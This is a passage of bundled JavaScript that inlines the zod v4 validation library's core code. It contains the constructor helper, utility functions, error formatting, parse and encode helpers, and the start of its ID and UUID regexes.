  $ZodCheckBigIntFormat: () => $ZodCheckBigIntFormat,
  $ZodCheck: () => $ZodCheck,
  $ZodCatch: () => $ZodCatch,
  $ZodCUID2: () => $ZodCUID2,
  $ZodCUID: () => $ZodCUID,
  $ZodCIDRv6: () => $ZodCIDRv6,
  $ZodCIDRv4: () => $ZodCIDRv4,
  $ZodBoolean: () => $ZodBoolean,
  $ZodBigIntFormat: () => $ZodBigIntFormat,
  $ZodBigInt: () => $ZodBigInt,
  $ZodBase64URL: () => $ZodBase64URL,
  $ZodBase64: () => $ZodBase64,
  $ZodAsyncError: () => $ZodAsyncError,
  $ZodArray: () => $ZodArray,
  $ZodAny: () => $ZodAny
});

// node_modules/zod/v4/core/core.js
var NEVER = Object.freeze({
  status: "aborted"
});
function $constructor(name, initializer, params) {
  function init(inst, def) {
    if (!inst._zod) {
      Object.defineProperty(inst, "_zod", {
        value: {
          def,
          constr: _,
          traits: new Set
        },
        enumerable: false
      });
    }
    if (inst._zod.traits.has(name)) {
      return;
    }
    inst._zod.traits.add(name);
    initializer(inst, def);
    const proto = _.prototype;
    const keys = Object.keys(proto);
    for (let i = 0;i < keys.length; i++) {
      const k = keys[i];
      if (!(k in inst)) {
        inst[k] = proto[k].bind(inst);
      }
    }
  }
  const Parent = params?.Parent ?? Object;

  class Definition extends Parent {
  }
  Object.defineProperty(Definition, "name", { value: name });
  function _(def) {
    var _a;
    const inst = params?.Parent ? new Definition : this;
    init(inst, def);
    (_a = inst._zod).deferred ?? (_a.deferred = []);
    for (const fn of inst._zod.deferred) {
      fn();
    }
    return inst;
  }
  Object.defineProperty(_, "init", { value: init });
  Object.defineProperty(_, Symbol.hasInstance, {
    value: (inst) => {
      if (params?.Parent && inst instanceof params.Parent)
        return true;
      return inst?._zod?.traits?.has(name);
    }
  });
  Object.defineProperty(_, "name", { value: name });
  return _;
}
var $brand = Symbol("zod_brand");

class $ZodAsyncError extends Error {
  constructor() {
    super(`Encountered Promise during synchronous parse. Use .parseAsync() instead.`);
  }
}

class $ZodEncodeError extends Error {
  constructor(name) {
    super(`Encountered unidirectional transform during encode: ${name}`);
    this.name = "ZodEncodeError";
  }
}
var globalConfig = {};
function config(newConfig) {
  if (newConfig)
    Object.assign(globalConfig, newConfig);
  return globalConfig;
}
// node_modules/zod/v4/core/util.js
var exports_util = {};
__export(exports_util, {
  unwrapMessage: () => unwrapMessage,
  uint8ArrayToHex: () => uint8ArrayToHex,
  uint8ArrayToBase64url: () => uint8ArrayToBase64url,
  uint8ArrayToBase64: () => uint8ArrayToBase64,
  stringifyPrimitive: () => stringifyPrimitive,
  slugify: () => slugify,
  shallowClone: () => shallowClone,
  safeExtend: () => safeExtend,
  required: () => required,
  randomString: () => randomString,
  propertyKeyTypes: () => propertyKeyTypes,
  promiseAllObject: () => promiseAllObject,
  primitiveTypes: () => primitiveTypes,
  prefixIssues: () => prefixIssues,
  pick: () => pick,
  partial: () => partial,
  parsedType: () => parsedType,
  optionalKeys: () => optionalKeys,
  omit: () => omit,
  objectClone: () => objectClone,
  numKeys: () => numKeys,
  nullish: () => nullish,
  normalizeParams: () => normalizeParams,
  mergeDefs: () => mergeDefs,
  merge: () => merge,
  jsonStringifyReplacer: () => jsonStringifyReplacer,
  joinValues: () => joinValues,
  issue: () => issue,
  isPlainObject: () => isPlainObject,
  isObject: () => isObject,
  hexToUint8Array: () => hexToUint8Array,
  getSizableOrigin: () => getSizableOrigin,
  getParsedType: () => getParsedType,
  getLengthableOrigin: () => getLengthableOrigin,
  getEnumValues: () => getEnumValues,
  getElementAtPath: () => getElementAtPath,
  floatSafeRemainder: () => floatSafeRemainder,
  finalizeIssue: () => finalizeIssue,
  extend: () => extend,
  escapeRegex: () => escapeRegex,
  esc: () => esc,
  defineLazy: () => defineLazy,
  createTransparentProxy: () => createTransparentProxy,
  cloneDef: () => cloneDef,
  clone: () => clone,
  cleanRegex: () => cleanRegex,
  cleanEnum: () => cleanEnum,
  captureStackTrace: () => captureStackTrace,
  cached: () => cached,
  base64urlToUint8Array: () => base64urlToUint8Array,
  base64ToUint8Array: () => base64ToUint8Array,
  assignProp: () => assignProp,
  assertNotEqual: () => assertNotEqual,
  assertNever: () => assertNever,
  assertIs: () => assertIs,
  assertEqual: () => assertEqual,
  assert: () => assert,
  allowsEval: () => allowsEval,
  aborted: () => aborted,
  NUMBER_FORMAT_RANGES: () => NUMBER_FORMAT_RANGES,
  Class: () => Class,
  BIGINT_FORMAT_RANGES: () => BIGINT_FORMAT_RANGES
});
function assertEqual(val) {
  return val;
}
function assertNotEqual(val) {
  return val;
}
function assertIs(_arg) {}
function assertNever(_x) {
  throw new Error("Unexpected value in exhaustive check");
}
function assert(_) {}
function getEnumValues(entries) {
  const numericValues = Object.values(entries).filter((v) => typeof v === "number");
  const values = Object.entries(entries).filter(([k, _]) => numericValues.indexOf(+k) === -1).map(([_, v]) => v);
  return values;
}
function joinValues(array, separator = "|") {
  return array.map((val) => stringifyPrimitive(val)).join(separator);
}
function jsonStringifyReplacer(_, value) {
  if (typeof value === "bigint")
    return value.toString();
  return value;
}
function cached(getter) {
  const set = false;
  return {
    get value() {
      if (!set) {
        const value = getter();
        Object.defineProperty(this, "value", { value });
        return value;
      }
      throw new Error("cached value already set");
    }
  };
}
function nullish(input) {
  return input === null || input === undefined;
}
function cleanRegex(source) {
  const start = source.startsWith("^") ? 1 : 0;
  const end = source.endsWith("$") ? source.length - 1 : source.length;
  return source.slice(start, end);
}
function floatSafeRemainder(val, step) {
  const valDecCount = (val.toString().split(".")[1] || "").length;
  const stepString = step.toString();
  let stepDecCount = (stepString.split(".")[1] || "").length;
  if (stepDecCount === 0 && /\d?e-\d?/.test(stepString)) {
    const match = stepString.match(/\d?e-(\d?)/);
    if (match?.[1]) {
      stepDecCount = Number.parseInt(match[1]);
    }
  }
  const decCount = valDecCount > stepDecCount ? valDecCount : stepDecCount;
  const valInt = Number.parseInt(val.toFixed(decCount).replace(".", ""));
  const stepInt = Number.parseInt(step.toFixed(decCount).replace(".", ""));
  return valInt % stepInt / 10 ** decCount;
}
var EVALUATING = Symbol("evaluating");
function defineLazy(object, key, getter) {
  let value = undefined;
  Object.defineProperty(object, key, {
    get() {
      if (value === EVALUATING) {
        return;
      }
      if (value === undefined) {
        value = EVALUATING;
        value = getter();
      }
      return value;
    },
    set(v) {
      Object.defineProperty(object, key, {
        value: v
      });
    },
    configurable: true
  });
}
function objectClone(obj) {
  return Object.create(Object.getPrototypeOf(obj), Object.getOwnPropertyDescriptors(obj));
}
function assignProp(target, prop, value) {
  Object.defineProperty(target, prop, {
    value,
    writable: true,
    enumerable: true,
    configurable: true
  });
}
function mergeDefs(...defs) {
  const mergedDescriptors = {};
  for (const def of defs) {
    const descriptors = Object.getOwnPropertyDescriptors(def);
    Object.assign(mergedDescriptors, descriptors);
  }
  return Object.defineProperties({}, mergedDescriptors);
}
function cloneDef(schema) {
  return mergeDefs(schema._zod.def);
}
function getElementAtPath(obj, path) {
  if (!path)
    return obj;
  return path.reduce((acc, key) => acc?.[key], obj);
}
function promiseAllObject(promisesObj) {
  const keys = Object.keys(promisesObj);
  const promises = keys.map((key) => promisesObj[key]);
  return Promise.all(promises).then((results) => {
    const resolvedObj = {};
    for (let i = 0;i < keys.length; i++) {
      resolvedObj[keys[i]] = results[i];
    }
    return resolvedObj;
  });
}
function randomString(length = 10) {
  const chars = "abcdefghijklmnopqrstuvwxyz";
  let str = "";
  for (let i = 0;i < length; i++) {
    str += chars[Math.floor(Math.random() * chars.length)];
  }
  return str;
}
function esc(str) {
  return JSON.stringify(str);
}
function slugify(input) {
  return input.toLowerCase().trim().replace(/[^\w\s-]/g, "").replace(/[\s_-]+/g, "-").replace(/^-+|-+$/g, "");
}
var captureStackTrace = "captureStackTrace" in Error ? Error.captureStackTrace : (..._args) => {};
function isObject(data) {
  return typeof data === "object" && data !== null && !Array.isArray(data);
}
var allowsEval = cached(() => {
  if (typeof navigator !== "undefined" && navigator?.userAgent?.includes("Cloudflare")) {
    return false;
  }
  try {
    const F = Function;
    new F("");
    return true;
  } catch (_) {
    return false;
  }
});
function isPlainObject(o) {
  if (isObject(o) === false)
    return false;
  const ctor = o.constructor;
  if (ctor === undefined)
    return true;
  if (typeof ctor !== "function")
    return true;
  const prot = ctor.prototype;
  if (isObject(prot) === false)
    return false;
  if (Object.prototype.hasOwnProperty.call(prot, "isPrototypeOf") === false) {
    return false;
  }
  return true;
}
function shallowClone(o) {
  if (isPlainObject(o))
    return { ...o };
  if (Array.isArray(o))
    return [...o];
  return o;
}
function numKeys(data) {
  let keyCount = 0;
  for (const key in data) {
    if (Object.prototype.hasOwnProperty.call(data, key)) {
      keyCount++;
    }
  }
  return keyCount;
}
var getParsedType = (data) => {
  const t = typeof data;
  switch (t) {
    case "undefined":
      return "undefined";
    case "string":
      return "string";
    case "number":
      return Number.isNaN(data) ? "nan" : "number";
    case "boolean":
      return "boolean";
    case "function":
      return "function";
    case "bigint":
      return "bigint";
    case "symbol":
      return "symbol";
    case "object":
      if (Array.isArray(data)) {
        return "array";
      }
      if (data === null) {
        return "null";
      }
      if (data.then && typeof data.then === "function" && data.catch && typeof data.catch === "function") {
        return "promise";
      }
      if (typeof Map !== "undefined" && data instanceof Map) {
        return "map";
      }
      if (typeof Set !== "undefined" && data instanceof Set) {
        return "set";
      }
      if (typeof Date !== "undefined" && data instanceof Date) {
        return "date";
      }
      if (typeof File !== "undefined" && data instanceof File) {
        return "file";
      }
      return "object";
    default:
      throw new Error(`Unknown data type: ${t}`);
  }
};
var propertyKeyTypes = new Set(["string", "number", "symbol"]);
var primitiveTypes = new Set(["string", "number", "bigint", "boolean", "symbol", "undefined"]);
function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}
function clone(inst, def, params) {
  const cl = new inst._zod.constr(def ?? inst._zod.def);
  if (!def || params?.parent)
    cl._zod.parent = inst;
  return cl;
}
function normalizeParams(_params) {
  const params = _params;
  if (!params)
    return {};
  if (typeof params === "string")
    return { error: () => params };
  if (params?.message !== undefined) {
    if (params?.error !== undefined)
      throw new Error("Cannot specify both `message` and `error` params");
    params.error = params.message;
  }
  delete params.message;
  if (typeof params.error === "string")
    return { ...params, error: () => params.error };
  return params;
}
function createTransparentProxy(getter) {
  let target;
  return new Proxy({}, {
    get(_, prop, receiver) {
      target ?? (target = getter());
      return Reflect.get(target, prop, receiver);
    },
    set(_, prop, value, receiver) {
      target ?? (target = getter());
      return Reflect.set(target, prop, value, receiver);
    },
    has(_, prop) {
      target ?? (target = getter());
      return Reflect.has(target, prop);
    },
    deleteProperty(_, prop) {
      target ?? (target = getter());
      return Reflect.deleteProperty(target, prop);
    },
    ownKeys(_) {
      target ?? (target = getter());
      return Reflect.ownKeys(target);
    },
    getOwnPropertyDescriptor(_, prop) {
      target ?? (target = getter());
      return Reflect.getOwnPropertyDescriptor(target, prop);
    },
    defineProperty(_, prop, descriptor) {
      target ?? (target = getter());
      return Reflect.defineProperty(target, prop, descriptor);
    }
  });
}
function stringifyPrimitive(value) {
  if (typeof value === "bigint")
    return value.toString() + "n";
  if (typeof value === "string")
    return `"${value}"`;
  return `${value}`;
}
function optionalKeys(shape) {
  return Object.keys(shape).filter((k) => {
    return shape[k]._zod.optin === "optional" && shape[k]._zod.optout === "optional";
  });
}
var NUMBER_FORMAT_RANGES = {
  safeint: [Number.MIN_SAFE_INTEGER, Number.MAX_SAFE_INTEGER],
  int32: [-2147483648, 2147483647],
  uint32: [0, 4294967295],
  float32: [-340282346638528860000000000000000000000, 340282346638528860000000000000000000000],
  float64: [-Number.MAX_VALUE, Number.MAX_VALUE]
};
var BIGINT_FORMAT_RANGES = {
  int64: [/* @__PURE__ */ BigInt("-9223372036854775808"), /* @__PURE__ */ BigInt("9223372036854775807")],
  uint64: [/* @__PURE__ */ BigInt(0), /* @__PURE__ */ BigInt("18446744073709551615")]
};
function pick(schema, mask) {
  const currDef = schema._zod.def;
  const checks = currDef.checks;
  const hasChecks = checks && checks.length > 0;
  if (hasChecks) {
    throw new Error(".pick() cannot be used on object schemas containing refinements");
  }
  const def = mergeDefs(schema._zod.def, {
    get shape() {
      const newShape = {};
      for (const key in mask) {
        if (!(key in currDef.shape)) {
          throw new Error(`Unrecognized key: "${key}"`);
        }
        if (!mask[key])
          continue;
        newShape[key] = currDef.shape[key];
      }
      assignProp(this, "shape", newShape);
      return newShape;
    },
    checks: []
  });
  return clone(schema, def);
}
function omit(schema, mask) {
  const currDef = schema._zod.def;
  const checks = currDef.checks;
  const hasChecks = checks && checks.length > 0;
  if (hasChecks) {
    throw new Error(".omit() cannot be used on object schemas containing refinements");
  }
  const def = mergeDefs(schema._zod.def, {
    get shape() {
      const newShape = { ...schema._zod.def.shape };
      for (const key in mask) {
        if (!(key in currDef.shape)) {
          throw new Error(`Unrecognized key: "${key}"`);
        }
        if (!mask[key])
          continue;
        delete newShape[key];
      }
      assignProp(this, "shape", newShape);
      return newShape;
    },
    checks: []
  });
  return clone(schema, def);
}
function extend(schema, shape) {
  if (!isPlainObject(shape)) {
    throw new Error("Invalid input to extend: expected a plain object");
  }
  const checks = schema._zod.def.checks;
  const hasChecks = checks && checks.length > 0;
  if (hasChecks) {
    const existingShape = schema._zod.def.shape;
    for (const key in shape) {
      if (Object.getOwnPropertyDescriptor(existingShape, key) !== undefined) {
        throw new Error("Cannot overwrite keys on object schemas containing refinements. Use `.safeExtend()` instead.");
      }
    }
  }
  const def = mergeDefs(schema._zod.def, {
    get shape() {
      const _shape = { ...schema._zod.def.shape, ...shape };
      assignProp(this, "shape", _shape);
      return _shape;
    }
  });
  return clone(schema, def);
}
function safeExtend(schema, shape) {
  if (!isPlainObject(shape)) {
    throw new Error("Invalid input to safeExtend: expected a plain object");
  }
  const def = mergeDefs(schema._zod.def, {
    get shape() {
      const _shape = { ...schema._zod.def.shape, ...shape };
      assignProp(this, "shape", _shape);
      return _shape;
    }
  });
  return clone(schema, def);
}
function merge(a, b) {
  const def = mergeDefs(a._zod.def, {
    get shape() {
      const _shape = { ...a._zod.def.shape, ...b._zod.def.shape };
      assignProp(this, "shape", _shape);
      return _shape;
    },
    get catchall() {
      return b._zod.def.catchall;
    },
    checks: []
  });
  return clone(a, def);
}
function partial(Class, schema, mask) {
  const currDef = schema._zod.def;
  const checks = currDef.checks;
  const hasChecks = checks && checks.length > 0;
  if (hasChecks) {
    throw new Error(".partial() cannot be used on object schemas containing refinements");
  }
  const def = mergeDefs(schema._zod.def, {
    get shape() {
      const oldShape = schema._zod.def.shape;
      const shape = { ...oldShape };
      if (mask) {
        for (const key in mask) {
          if (!(key in oldShape)) {
            throw new Error(`Unrecognized key: "${key}"`);
          }
          if (!mask[key])
            continue;
          shape[key] = Class ? new Class({
            type: "optional",
            innerType: oldShape[key]
          }) : oldShape[key];
        }
      } else {
        for (const key in oldShape) {
          shape[key] = Class ? new Class({
            type: "optional",
            innerType: oldShape[key]
          }) : oldShape[key];
        }
      }
      assignProp(this, "shape", shape);
      return shape;
    },
    checks: []
  });
  return clone(schema, def);
}
function required(Class, schema, mask) {
  const def = mergeDefs(schema._zod.def, {
    get shape() {
      const oldShape = schema._zod.def.shape;
      const shape = { ...oldShape };
      if (mask) {
        for (const key in mask) {
          if (!(key in shape)) {
            throw new Error(`Unrecognized key: "${key}"`);
          }
          if (!mask[key])
            continue;
          shape[key] = new Class({
            type: "nonoptional",
            innerType: oldShape[key]
          });
        }
      } else {
        for (const key in oldShape) {
          shape[key] = new Class({
            type: "nonoptional",
            innerType: oldShape[key]
          });
        }
      }
      assignProp(this, "shape", shape);
      return shape;
    }
  });
  return clone(schema, def);
}
function aborted(x, startIndex = 0) {
  if (x.aborted === true)
    return true;
  for (let i = startIndex;i < x.issues.length; i++) {
    if (x.issues[i]?.continue !== true) {
      return true;
    }
  }
  return false;
}
function prefixIssues(path, issues) {
  return issues.map((iss) => {
    var _a;
    (_a = iss).path ?? (_a.path = []);
    iss.path.unshift(path);
    return iss;
  });
}
function unwrapMessage(message) {
  return typeof message === "string" ? message : message?.message;
}
function finalizeIssue(iss, ctx, config2) {
  const full = { ...iss, path: iss.path ?? [] };
  if (!iss.message) {
    const message = unwrapMessage(iss.inst?._zod.def?.error?.(iss)) ?? unwrapMessage(ctx?.error?.(iss)) ?? unwrapMessage(config2.customError?.(iss)) ?? unwrapMessage(config2.localeError?.(iss)) ?? "Invalid input";
    full.message = message;
  }
  delete full.inst;
  delete full.continue;
  if (!ctx?.reportInput) {
    delete full.input;
  }
  return full;
}
function getSizableOrigin(input) {
  if (input instanceof Set)
    return "set";
  if (input instanceof Map)
    return "map";
  if (input instanceof File)
    return "file";
  return "unknown";
}
function getLengthableOrigin(input) {
  if (Array.isArray(input))
    return "array";
  if (typeof input === "string")
    return "string";
  return "unknown";
}
function parsedType(data) {
  const t = typeof data;
  switch (t) {
    case "number": {
      return Number.isNaN(data) ? "nan" : "number";
    }
    case "object": {
      if (data === null) {
        return "null";
      }
      if (Array.isArray(data)) {
        return "array";
      }
      const obj = data;
      if (obj && Object.getPrototypeOf(obj) !== Object.prototype && "constructor" in obj && obj.constructor) {
        return obj.constructor.name;
      }
    }
  }
  return t;
}
function issue(...args) {
  const [iss, input, inst] = args;
  if (typeof iss === "string") {
    return {
      message: iss,
      code: "custom",
      input,
      inst
    };
  }
  return { ...iss };
}
function cleanEnum(obj) {
  return Object.entries(obj).filter(([k, _]) => {
    return Number.isNaN(Number.parseInt(k, 10));
  }).map((el) => el[1]);
}
function base64ToUint8Array(base64) {
  const binaryString = atob(base64);
  const bytes = new Uint8Array(binaryString.length);
  for (let i = 0;i < binaryString.length; i++) {
    bytes[i] = binaryString.charCodeAt(i);
  }
  return bytes;
}
function uint8ArrayToBase64(bytes) {
  let binaryString = "";
  for (let i = 0;i < bytes.length; i++) {
    binaryString += String.fromCharCode(bytes[i]);
  }
  return btoa(binaryString);
}
function base64urlToUint8Array(base64url) {
  const base64 = base64url.replace(/-/g, "+").replace(/_/g, "/");
  const padding = "=".repeat((4 - base64.length % 4) % 4);
  return base64ToUint8Array(base64 + padding);
}
function uint8ArrayToBase64url(bytes) {
  return uint8ArrayToBase64(bytes).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
}
function hexToUint8Array(hex) {
  const cleanHex = hex.replace(/^0x/, "");
  if (cleanHex.length % 2 !== 0) {
    throw new Error("Invalid hex string length");
  }
  const bytes = new Uint8Array(cleanHex.length / 2);
  for (let i = 0;i < cleanHex.length; i += 2) {
    bytes[i / 2] = Number.parseInt(cleanHex.slice(i, i + 2), 16);
  }
  return bytes;
}
function uint8ArrayToHex(bytes) {
  return Array.from(bytes).map((b) => b.toString(16).padStart(2, "0")).join("");
}

class Class {
  constructor(..._args) {}
}

// node_modules/zod/v4/core/errors.js
var initializer = (inst, def) => {
  inst.name = "$ZodError";
  Object.defineProperty(inst, "_zod", {
    value: inst._zod,
    enumerable: false
  });
  Object.defineProperty(inst, "issues", {
    value: def,
    enumerable: false
  });
  inst.message = JSON.stringify(def, jsonStringifyReplacer, 2);
  Object.defineProperty(inst, "toString", {
    value: () => inst.message,
    enumerable: false
  });
};
var $ZodError = $constructor("$ZodError", initializer);
var $ZodRealError = $constructor("$ZodError", initializer, { Parent: Error });
function flattenError(error, mapper = (issue2) => issue2.message) {
  const fieldErrors = {};
  const formErrors = [];
  for (const sub of error.issues) {
    if (sub.path.length > 0) {
      fieldErrors[sub.path[0]] = fieldErrors[sub.path[0]] || [];
      fieldErrors[sub.path[0]].push(mapper(sub));
    } else {
      formErrors.push(mapper(sub));
    }
  }
  return { formErrors, fieldErrors };
}
function formatError(error, mapper = (issue2) => issue2.message) {
  const fieldErrors = { _errors: [] };
  const processError = (error2) => {
    for (const issue2 of error2.issues) {
      if (issue2.code === "invalid_union" && issue2.errors.length) {
        issue2.errors.map((issues) => processError({ issues }));
      } else if (issue2.code === "invalid_key") {
        processError({ issues: issue2.issues });
      } else if (issue2.code === "invalid_element") {
        processError({ issues: issue2.issues });
      } else if (issue2.path.length === 0) {
        fieldErrors._errors.push(mapper(issue2));
      } else {
        let curr = fieldErrors;
        let i = 0;
        while (i < issue2.path.length) {
          const el = issue2.path[i];
          const terminal = i === issue2.path.length - 1;
          if (!terminal) {
            curr[el] = curr[el] || { _errors: [] };
          } else {
            curr[el] = curr[el] || { _errors: [] };
            curr[el]._errors.push(mapper(issue2));
          }
          curr = curr[el];
          i++;
        }
      }
    }
  };
  processError(error);
  return fieldErrors;
}
function treeifyError(error, mapper = (issue2) => issue2.message) {
  const result = { errors: [] };
  const processError = (error2, path = []) => {
    var _a, _b;
    for (const issue2 of error2.issues) {
      if (issue2.code === "invalid_union" && issue2.errors.length) {
        issue2.errors.map((issues) => processError({ issues }, issue2.path));
      } else if (issue2.code === "invalid_key") {
        processError({ issues: issue2.issues }, issue2.path);
      } else if (issue2.code === "invalid_element") {
        processError({ issues: issue2.issues }, issue2.path);
      } else {
        const fullpath = [...path, ...issue2.path];
        if (fullpath.length === 0) {
          result.errors.push(mapper(issue2));
          continue;
        }
        let curr = result;
        let i = 0;
        while (i < fullpath.length) {
          const el = fullpath[i];
          const terminal = i === fullpath.length - 1;
          if (typeof el === "string") {
            curr.properties ?? (curr.properties = {});
            (_a = curr.properties)[el] ?? (_a[el] = { errors: [] });
            curr = curr.properties[el];
          } else {
            curr.items ?? (curr.items = []);
            (_b = curr.items)[el] ?? (_b[el] = { errors: [] });
            curr = curr.items[el];
          }
          if (terminal) {
            curr.errors.push(mapper(issue2));
          }
          i++;
        }
      }
    }
  };
  processError(error);
  return result;
}
function toDotPath(_path) {
  const segs = [];
  const path = _path.map((seg) => typeof seg === "object" ? seg.key : seg);
  for (const seg of path) {
    if (typeof seg === "number")
      segs.push(`[${seg}]`);
    else if (typeof seg === "symbol")
      segs.push(`[${JSON.stringify(String(seg))}]`);
    else if (/[^\w$]/.test(seg))
      segs.push(`[${JSON.stringify(seg)}]`);
    else {
      if (segs.length)
        segs.push(".");
      segs.push(seg);
    }
  }
  return segs.join("");
}
function prettifyError(error) {
  const lines = [];
  const issues = [...error.issues].sort((a, b) => (a.path ?? []).length - (b.path ?? []).length);
  for (const issue2 of issues) {
    lines.push(`\u2716 ${issue2.message}`);
    if (issue2.path?.length)
      lines.push(`  \u2192 at ${toDotPath(issue2.path)}`);
  }
  return lines.join(`
`);
}

// node_modules/zod/v4/core/parse.js
var _parse = (_Err) => (schema, value, _ctx, _params) => {
  const ctx = _ctx ? Object.assign(_ctx, { async: false }) : { async: false };
  const result = schema._zod.run({ value, issues: [] }, ctx);
  if (result instanceof Promise) {
    throw new $ZodAsyncError;
  }
  if (result.issues.length) {
    const e = new (_params?.Err ?? _Err)(result.issues.map((iss) => finalizeIssue(iss, ctx, config())));
    captureStackTrace(e, _params?.callee);
    throw e;
  }
  return result.value;
};
var parse = /* @__PURE__ */ _parse($ZodRealError);
var _parseAsync = (_Err) => async (schema, value, _ctx, params) => {
  const ctx = _ctx ? Object.assign(_ctx, { async: true }) : { async: true };
  let result = schema._zod.run({ value, issues: [] }, ctx);
  if (result instanceof Promise)
    result = await result;
  if (result.issues.length) {
    const e = new (params?.Err ?? _Err)(result.issues.map((iss) => finalizeIssue(iss, ctx, config())));
    captureStackTrace(e, params?.callee);
    throw e;
  }
  return result.value;
};
var parseAsync = /* @__PURE__ */ _parseAsync($ZodRealError);
var _safeParse = (_Err) => (schema, value, _ctx) => {
  const ctx = _ctx ? { ..._ctx, async: false } : { async: false };
  const result = schema._zod.run({ value, issues: [] }, ctx);
  if (result instanceof Promise) {
    throw new $ZodAsyncError;
  }
  return result.issues.length ? {
    success: false,
    error: new (_Err ?? $ZodError)(result.issues.map((iss) => finalizeIssue(iss, ctx, config())))
  } : { success: true, data: result.value };
};
var safeParse = /* @__PURE__ */ _safeParse($ZodRealError);
var _safeParseAsync = (_Err) => async (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { async: true }) : { async: true };
  let result = schema._zod.run({ value, issues: [] }, ctx);
  if (result instanceof Promise)
    result = await result;
  return result.issues.length ? {
    success: false,
    error: new _Err(result.issues.map((iss) => finalizeIssue(iss, ctx, config())))
  } : { success: true, data: result.value };
};
var safeParseAsync = /* @__PURE__ */ _safeParseAsync($ZodRealError);
var _encode = (_Err) => (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { direction: "backward" }) : { direction: "backward" };
  return _parse(_Err)(schema, value, ctx);
};
var encode = /* @__PURE__ */ _encode($ZodRealError);
var _decode = (_Err) => (schema, value, _ctx) => {
  return _parse(_Err)(schema, value, _ctx);
};
var decode = /* @__PURE__ */ _decode($ZodRealError);
var _encodeAsync = (_Err) => async (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { direction: "backward" }) : { direction: "backward" };
  return _parseAsync(_Err)(schema, value, ctx);
};
var encodeAsync = /* @__PURE__ */ _encodeAsync($ZodRealError);
var _decodeAsync = (_Err) => async (schema, value, _ctx) => {
  return _parseAsync(_Err)(schema, value, _ctx);
};
var decodeAsync = /* @__PURE__ */ _decodeAsync($ZodRealError);
var _safeEncode = (_Err) => (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { direction: "backward" }) : { direction: "backward" };
  return _safeParse(_Err)(schema, value, ctx);
};
var safeEncode = /* @__PURE__ */ _safeEncode($ZodRealError);
var _safeDecode = (_Err) => (schema, value, _ctx) => {
  return _safeParse(_Err)(schema, value, _ctx);
};
var safeDecode = /* @__PURE__ */ _safeDecode($ZodRealError);
var _safeEncodeAsync = (_Err) => async (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { direction: "backward" }) : { direction: "backward" };
  return _safeParseAsync(_Err)(schema, value, ctx);
};
var safeEncodeAsync = /* @__PURE__ */ _safeEncodeAsync($ZodRealError);
var _safeDecodeAsync = (_Err) => async (schema, value, _ctx) => {
  return _safeParseAsync(_Err)(schema, value, _ctx);
};
var safeDecodeAsync = /* @__PURE__ */ _safeDecodeAsync($ZodRealError);
// node_modules/zod/v4/core/regexes.js
var exports_regexes = {};
__export(exports_regexes, {
  xid: () => xid,
  uuid7: () => uuid7,
  uuid6: () => uuid6,
  uuid4: () => uuid4,
  uuid: () => uuid,
  uppercase: () => uppercase,
  unicodeEmail: () => unicodeEmail,
  undefined: () => _undefined,
  ulid: () => ulid,
  time: () => time,
  string: () => string,
  sha512_hex: () => sha512_hex,
  sha512_base64url: () => sha512_base64url,
  sha512_base64: () => sha512_base64,
  sha384_hex: () => sha384_hex,
  sha384_base64url: () => sha384_base64url,
  sha384_base64: () => sha384_base64,
  sha256_hex: () => sha256_hex,
  sha256_base64url: () => sha256_base64url,
  sha256_base64: () => sha256_base64,
  sha1_hex: () => sha1_hex,
  sha1_base64url: () => sha1_base64url,
  sha1_base64: () => sha1_base64,
  rfc5322Email: () => rfc5322Email,
  number: () => number,
  null: () => _null,
  nanoid: () => nanoid,
  md5_hex: () => md5_hex,
  md5_base64url: () => md5_base64url,
  md5_base64: () => md5_base64,
  mac: () => mac,
  lowercase: () => lowercase,
  ksuid: () => ksuid,
  ipv6: () => ipv6,
  ipv4: () => ipv4,
  integer: () => integer,
  idnEmail: () => idnEmail,
  html5Email: () => html5Email,
  hostname: () => hostname,
  hex: () => hex,
  guid: () => guid,
  extendedDuration: () => extendedDuration,
  emoji: () => emoji,
  email: () => email,
  e164: () => e164,
  duration: () => duration,
  domain: () => domain,
  datetime: () => datetime,
  date: () => date,
  cuid2: () => cuid2,
  cuid: () => cuid,
  cidrv6: () => cidrv6,
  cidrv4: () => cidrv4,
  browserEmail: () => browserEmail,
  boolean: () => boolean,
  bigint: () => bigint,
  base64url: () => base64url,
  base64: () => base64
});
var cuid = /^[cC][^\s-]{8,}$/;
var cuid2 = /^[0-9a-z]+$/;
var ulid = /^[0-9A-HJKMNP-TV-Za-hjkmnp-tv-z]{26}$/;
var xid = /^[0-9a-vA-V]{20}$/;
var ksuid = /^[A-Za-z0-9]{27}$/;
var nanoid = /^[a-zA-Z0-9_-]{21}$/;
var duration = /^P(?:(\d+W)|(?!.*W)(?=\d|T\d)(\d+Y)?(\d+M)?(\d+D)?(T(?=\d)(\d+H)?(\d+M)?(\d+([.,]\d+)?S)?)?)$/;
var extendedDuration = /^[-+]?P(?!$)(?:(?:[-+]?\d+Y)|(?:[-+]?\d+[.,]\d+Y$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:(?:[-+]?\d+W)|(?:[-+]?\d+[.,]\d+W$))?(?:(?:[-+]?\d+D)|(?:[-+]?\d+[.,]\d+D$))?(?:T(?=[\d+-])(?:(?:[-+]?\d+H)|(?:[-+]?\d+[.,]\d+H$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:[-+]?\d+(?:[.,]\d+)?S)?)??$/;
var guid = /^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})$/;
var uuid = (version) => {
  if (!version)
    return /^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-8][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}|00000000-0000-0000-0000-000000000000|ffffffff-ffff-ffff-ffff-ffffffffffff)$/;
  return new RegExp(`^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-${version}[0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12})$`);
};
var uuid4 = /* @__PURE__ */ uuid(4);
var uuid6 = /* @__PURE__ */ uuid(6);
var uuid7 = /* @__PURE__ */ uuid(7);
